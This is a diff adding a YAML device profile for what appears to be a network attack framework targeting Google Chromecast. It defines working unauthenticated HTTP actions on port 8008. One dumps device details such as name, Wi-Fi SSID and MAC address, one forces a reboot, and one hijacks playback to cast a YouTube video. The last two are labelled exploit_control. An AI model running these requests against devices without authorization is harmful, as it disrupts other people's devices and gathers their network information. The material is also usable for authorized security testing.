@@ -1,0 +1,55 @@
+id: chromecast
+device_type: streamer
+vendor: Google
+family: chromecast
+requires:
+  port: 8008
+actions:
+
+  - id: dump-eureka
+    label: "Dump device info (eureka_info)"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}:8008/setup/eureka_info?options=detail"
+          save_as: eureka
+          timeout: 5
+      - extract:
+          from: $eureka
+          fields:
+            name: '"name":"([^"]+)"'
+            ssid: '"ssid":"([^"]+)"'
+            mac: '"mac_address":"([^"]+)"'
+            build: '"build_version":"([^"]+)"'
+            timezone: '"timezone":"([^"]+)"'
+      - note: "Extracted device_name={{state.name}} ssid={{state.ssid}}"
+
+  - id: reboot
+    label: "Reboot the Chromecast"
+    category: exploit_control
+    dangerous: true
+    confirm_prompt: "This will reboot the target Chromecast. Continue?"
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}:8008/setup/reboot"
+          method: POST
+          headers:
+            Content-Type: application/json
+          body: '{"params":"now"}'
+          timeout: 5
+
+  - id: cast-youtube
+    label: "Force play YouTube video ID"
+    category: exploit_control
+    dangerous: true
+    confirm_prompt: "This will interrupt anything the Chromecast is playing."
+    steps:
+      - note: "Casts YouTube video via DIAL"
+      - http_request:
+          url: "http://{{target.ip}}:8008/apps/YouTube"
+          method: POST
+          headers:
+            Content-Type: application/x-www-form-urlencoded
+          body: "v=dQw4w9WgXcQ"
+          timeout: 5
